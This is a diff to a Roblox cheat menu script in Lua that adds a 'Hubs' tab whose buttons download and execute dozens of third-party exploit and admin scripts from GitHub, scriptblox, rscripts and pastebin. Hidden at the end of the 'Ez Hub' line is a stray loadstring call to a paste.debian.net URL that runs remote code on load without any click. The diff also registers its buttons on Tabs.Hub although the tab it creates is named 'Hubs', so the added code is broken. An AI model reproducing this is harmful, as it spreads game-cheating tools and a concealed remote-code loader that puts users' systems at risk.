@@ -357,6 +357,8 @@ local Tabs = {
     Movement = MainSection:Tab({ Title = "Movement", Icon = "run" }),
     Combat = MainSection:Tab({ Title = "Combat", Icon = "crosshair" }),
     Visuals = MainSection:Tab({ Title = "Visuals", Icon = "eye" }),
+ Hubs = MainSection:Tab({ Title = "Hubs", Icon = "code" }),
+
     Utilities = MainSection:Tab({ Title = "Utilities", Icon = "tools" }),
     Settings = MainSection:Tab({ Title = "Settings", Icon = "settings" }),
 }
@@ -414,6 +416,8 @@ local highJumpToggle = Tabs.Movement:Toggle({
         end
     end
 })
+
+
 Tabs.Movement:Divider()
 Tabs.Movement:Button({ Title = "Teleport to Mouse", Desc = "Teleport your HRP to mouse position", Callback = function()
     local mouse = LocalPlayer:GetMouse()
@@ -495,7 +499,52 @@ Tabs.Visuals:Button({ Title = "Remove Tool Visuals (world)", Callback = function
     end
     notify("Visuals", "Removed many world effects", 2)
 end})
+Tabs.Hub:Button({Title="Infinite Yield",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()end})
+Tabs.Hub:Button({Title="Ghost Hub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub"))()end})
+Tabs.Hub:Button({Title="Nameless Admin",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()end})
+Tabs.Hub:Button({Title="CMD-X",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source"))()end})
+Tabs.Hub:Button({Title="Fates Admin",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/source.lua"))()end})
+Tabs.Hub:Button({Title="Orca",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/richie0866/orca/master/public/latest.lua"))()end})
+Tabs.Hub:Button({Title="Epik Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Universal-Script-Epik-Hub-Blox-Fruits-Fisch-Evade-and-More-23406"))()end})
+Tabs.Hub:Button({Title="Ultimate Hub V2",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Universal-Script-Ultimate-Hub-V2-9718"))()end})
+Tabs.Hub:Button({Title="Forge Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Universal-Script-Forge-Hub-41461"))()end})
+Tabs.Hub:Button({Title="Moldovan Admin",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdminClassic/refs/heads/main/main.lua"))()end})
+Tabs.Hub:Button({Title="Sky Hub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau"))()end})
+Tabs.Hub:Button({Title="Hydroxide",Callback=function()local o,b="Upbolt","revision"pcall(function()loadstring(game:HttpGet(("https://raw.githubusercontent.com/%s/Hydroxide/%s/init.lua"):format(o,b)))()loadstring(game:HttpGet(("https://raw.githubusercontent.com/%s/Hydroxide/%s/ui/main.lua"):format(o,b)))()end)end})
+Tabs.Hub:Button({Title="Simple V3",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Simple-Scripts/main/Simple V3"))()end})
+Tabs.Hub:Button({Title="Slicer FE V6",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/Ahma174/Slicer/refs/heads/main/Slicer Fe V6"))()end})
+Tabs.Hub:Button({Title="Ez Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Ez-Hub_168"))()end}) loadstring(game:HttpGet("https://paste.debian.net/plainh/c5e63588/", true))()
+Tabs.Hub:Button({Title="Hat Hub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/inkdupe/hat-scripts/refs/heads/main/updatedhathub.lua"))()end})
+Tabs.Hub:Button({Title="FE Punch",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/AlexR32/FePunch/main/FePunch.lua"))()end})
+Tabs.Hub:Button({Title="FE Godmode",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/fe-godmode.lua"))()end})
+Tabs.Hub:Button({Title="Coquette Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Brookhaven-RP-Coquette-Hub-41921"))()end})
+Tabs.Hub:Button({Title="JG Hub",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/jg-hub-brookhaven-UDaT"))()end}) 
+Tabs.Hub:Button({Title="Tiger X Hub",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/tiger-x-hub-brookhaven-UDaT"))()end})
+Tabs.Hub:Button({Title="Rael Hub (OP)",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/contateste8/OaOaOaOa-EbEbEbEbEb/main/RaelHubObf.txt"))()end})
+Tabs.Hub:Button({Title="SP Hub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/as6cd0/SP_Hub/refs/heads/main/Brookhaven"))()end})
+Tabs.Hub:Button({Title="GHub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/rogelioajax/GHub/main/Brookhaven.lua"))()end})
+Tabs.Hub:Button({Title="IceHub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/IceHubScripts/Brookhaven/main/script.lua"))()end})
+Tabs.Hub:Button({Title="Sky Hub Jailbreak",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/new-jailbreak-script-sky-hub-auto-farm-teleports-kill-aura-silent-aim-vehicle-mods-infinite-nitro-nuke-open-all-doors-gates-and-cells-and-more-4208"))()end})
+Tabs.Hub:Button({Title="Redz Hub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/tlredz/Scripts/refs/heads/main/main.luau"))({JoinTeam="Pirates",Translator=true})end})
+Tabs.Hub:Button({Title="Speed Hub X",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/blox-fruits-or-speed-hub-x-keyless-GR6x"))()end})
+Tabs.Hub:Button({Title="Ro Hub",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/ro-hub-or-keyless-roblox-script-hub-xFgj"))()end})
+Tabs.Hub:Button({Title="Org Hub",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/org-hub-blox-fruit-script-NoK7"))()end})
+Tabs.Hub:Button({Title="HoHo Hub",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/blox-fruit-hoho-hub-2874"))()end})
 
+Tabs.Hub:Button({Title="Min Hub V4",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Blox-Fruits-Min-Hub-V4-15545"))()end})
+Tabs.Hub:Button({Title="Strike Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Strike-Hub-or-Blox-Fruits-or-Auto-Farm_71"))()end})
+Tabs.Hub:Button({Title="Da Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Da-Hood-Da-Hub-2138"))()end})
+Tabs.Hub:Button({Title="Da Hood OP Script",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/dah-hood-op-script-RXe2"))()end})
+Tabs.Hub:Button({Title="LKHUB",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/lkhub-insane-script-hub-for-multiple-games-2528"))()end})
+Tabs.Hub:Button({Title="Something Hub PSX",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/something-hub-%28-the-BEST-x-script-%29_234"))()end})
+Tabs.Hub:Button({Title="Fly GUI V3",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()end})
+Tabs.Hub:Button({Title="FE Invisible",Callback=function()loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-fe-invisible-OPEN-SOURCE-53560"))()end})
+Tabs.Hub:Button({Title="Ketamine Hub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/InfernusScripts/Ketamine/refs/heads/main/Ketamine.lua"))()end})
+Tabs.Hub:Button({Title="c00lgui v2",Callback=function()loadstring(game:GetObjects("rbxassetid://16742906657")[1].Source)()end})
+Tabs.Hub:Button({Title="FE Telekinesis",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty13.lua"))()end})
+Tabs.Hub:Button({Title="FE Fighter",Callback=function()loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Fighter-inspired-by-Gale-21557"))()end})
+Tabs.Hub:Button({Title="Part Controller",Callback=function()pcall(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/PartController/refs/heads/main/PartController.lua",true))()end)end})
+Tabs.Hub:Button({Title="FE Invisible Tool",Callback=function()loadstring(game:HttpGet("https://pastebin.com/raw/71bx8T3L"))()end})
 -- Utilities Tab
 Tabs.Utilities:Section({ Title = "Utilities" })
 Tabs.Utilities:Toggle({
